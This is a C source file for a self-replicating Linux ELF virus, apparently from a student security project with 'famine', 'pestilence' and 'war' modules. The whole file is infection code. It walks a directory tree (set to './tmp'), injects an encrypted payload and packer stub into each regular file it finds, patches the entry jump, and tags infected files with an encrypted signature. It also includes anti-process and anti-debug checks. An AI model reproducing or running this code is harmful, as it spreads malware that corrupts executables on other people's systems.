#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <elf.h>
#include <dirent.h>

#include "map.h"
#include "utils.h"
#include "bss.h"
#include "text.h"
#include "pestilence.h"
#include "syscall.h"
#include "famine.h"
#include "war.h"

extern void end();
void famine(void);

#define JMP_OFFSET 0x6
#define JMP_SIZE 4

void	__attribute__((naked)) _start(void)
{
	__asm__ ("call famine\n"
			 "jmp end    \n");
}

static int	patch_new_file(t_data *data, const char *filename) {

	_syscall(SYS_unlink, filename);

	int fd = _syscall(SYS_open, filename, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
	if (fd == -1)
		return 1;

	if (_syscall(SYS_write, fd, data->file, data->size) == -1) {
		_syscall(SYS_close, fd);
		return 1;
	}

	_syscall(SYS_close, fd);

	return 0;
}

static int64_t calc_jmp(uint64_t from, uint64_t to, uint64_t offset) {
	return (int64_t)to - (int64_t)from - (int64_t)offset;
}

static int packer(t_data *data) {
	data->packer.p_size = (size_t)&packer_end - (size_t)&packer_start;

	if (text(data, data->packer.p_size) != 0) {
		return 1;
	}

	return 0;
}

static void init_patch(t_data *data, size_t jmp_rel_offset) {

	//ft_memset(patch, 0, sizeof(t_patch));
	t_patch *patch = &data->patch;

	/* calculate the difference between the cave and the packer 
	 * will always be positive cause .data is after the .text */
	uint64_t addr_diff = data->cave.addr - data->packer.addr;

	patch->jmp = (int32_t)(addr_diff - jmp_rel_offset - sizeof(int32_t) - 1);

	char signature[43] = "\x53\x1d\x27\x16\xd7\x1c\x17\xb6\x76\x55\x25\x1b\xdc\x1d\x17\xfc\x6c\x5c" 
						 "\x2e\x07\xcb\x01\x55\xe6\x7e\x5c\x67\x5f\xca\x0d\x45\xff\x77\x13\x3f\x13"
						 "\x83\x49\x07\xae\x25\x76\x00";

	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);

	update_fingerprint(&signature[ft_strlen(signature) - 14], data);

	ft_strlcpy(patch->signature, signature, sizeof(patch->signature));

	//patch->mprotect_size = data->data_page_size;

	patch->decrypt_size = data->cave.p_size;

	patch->virus_offset = addr_diff;

	patch->key = gen_key_64();
}

static int packer_patch(t_data *data) {

	size_t jmp_rel_offset = (size_t)&jmp_rel - (size_t)&packer_start;

	init_patch(data, jmp_rel_offset);

	/* copy the packer */
	ft_memcpy(data->file + data->packer.offset, &packer_start, data->packer.p_size);
	/* patch the packer, jmp_rel offset is where the data of the packer is stored */
	ft_memcpy(data->file + data->packer.offset + jmp_rel_offset + 1, &data->patch, sizeof(t_patch));

	return 0;

}

static int	inject(t_data *data) {

	if (packer(data) != 0) {
		return 1;
	}

	if (bss(data, data->cave.p_size) != 0) {
		return 1;
	}

	packer_patch(data);

	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->packer.old_entry, JMP_OFFSET + JMP_SIZE);

	ft_memcpy(data->file + data->cave.offset, &_start, data->cave.p_size);

	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, &data->cave.rel_jmp, JMP_SIZE);

	encrypt(data->file + data->cave.offset, data->cave.p_size, data->patch.key);

	return 0;
}

static int	already_patched(t_data *data)
{
	char signature[26] = "\x53\x1d\x27\x16\xd7\x1c\x17\xb6\x76\x55\x25\x1b\xdc\x1d\x17\xfc\x6c\x5c\x2e\x07\xcb\x01\x55\xe6\x7e\x00";

	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);

	if (search_signature(data, signature) != NULL) {
		return 1;
	}
	return 0;
}

static int	infect(const char *filename, const char *self_name)
{

	t_data data;
	ft_memset(&data, 0, sizeof(t_data));

	/* copy the name of the target */
	ft_strlcpy(data.target_name, filename, sizeof(data.target_name));

	/* get our own name */
	ft_strlcpy(data.self_name, self_name, sizeof(data.self_name));

	/* calculate the size of the payload before the mapping */
	data.cave.p_size = (size_t)&end - (size_t)&_start;

	if (map_file(filename, &data) != 0) {
		return 1;
	}

	updade_hdr(&data);

	if (already_patched(&data) != 0) {
		free_data(&data);
		return 1;
	}

	if (inject(&data) != 0) {
		free_data(&data);
		return 1;
	}

	if (patch_new_file(&data, filename) != 0) {
		free_data(&data);
		return 1;
	}

	//_syscall(SYS_msync, data.file, data.size, MS_SYNC);
	free_data(&data);

	return 0;
}

static void	open_file(const char *file, const char *self_path, size_t *counter)
{

	int fd = _syscall(SYS_open, file, O_RDONLY);
	if (fd < 0)
		return ;

	char buf[PATH_MAX];
	struct dirent *dir;
	ssize_t ret;

	for(;;)
	{
		ret = _syscall(SYS_getdents64, fd, buf, PATH_MAX);
		if (ret <= 0)
			break;
		for (ssize_t i = 0; i < ret; i += dir->d_reclen)
		{
			dir = (struct dirent *)(buf + i);

			if (dir->d_name[0] == '.'
				&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
				continue;
			
			if (dir->d_type == DT_REG) {

				char new_path[PATH_MAX];

				make_path(new_path, file, dir->d_name);

				if (infect(new_path, self_path) == 0) {
					(*counter)++;
				}

			} else if (dir->d_type == DT_DIR) {
				char new_path[PATH_MAX];

				make_path(new_path, file, dir->d_name);

				open_file(new_path, self_path, counter);
			}
		}
	}

	_syscall(SYS_close, fd);
}

void	famine(void)
{
	//if (check_ptrace() != 0 || forbid_proc() != 0)
	//	_syscall(SYS_exit, 1);
	if (forbid_proc() != 0) {
		char msg[] = "forbid_proc\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		_syscall(SYS_exit, 1);
	}

	size_t counter = 0;
	char host_name[PATH_MAX];

	if (self_name(host_name) != 0) {
		return ;
	}

	const char p1[] = "./tmp";
	const char *paths[] = {
		p1,
		(void *)0,
	};

	for (int i = 0; paths[i]; ++i)
		open_file(paths[i], host_name, &counter);

	if (counter != 0) {
		self_fingerprint(host_name, counter);
	}
}
